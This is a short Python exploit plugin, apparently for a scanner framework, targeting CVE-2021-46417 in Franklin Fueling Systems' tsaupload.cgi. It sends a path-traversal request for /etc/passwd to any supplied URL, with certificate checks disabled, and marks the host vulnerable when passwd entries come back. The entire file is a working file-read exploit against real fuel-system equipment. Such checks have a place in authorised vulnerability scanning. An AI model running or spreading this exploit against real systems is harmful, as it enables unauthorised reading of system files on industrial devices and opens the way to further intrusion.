#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {}
  ret['links'] = ["https://peiqi.wgpsec.org/wiki/webapp/Franklin/Franklin%20Fueling%20Systems%20tsaupload.cgi%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-46417.html"]
  ret['huixian'] = []
  ret['method'] = 'get'
  ret['bugname'] = "Franklin Fueling Systems tsaupload.cgi任意文件读取(CVE-2021-46417)漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/cgi-bin/tsaupload.cgi?file_name=../../../../../../etc/passwd&password="
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret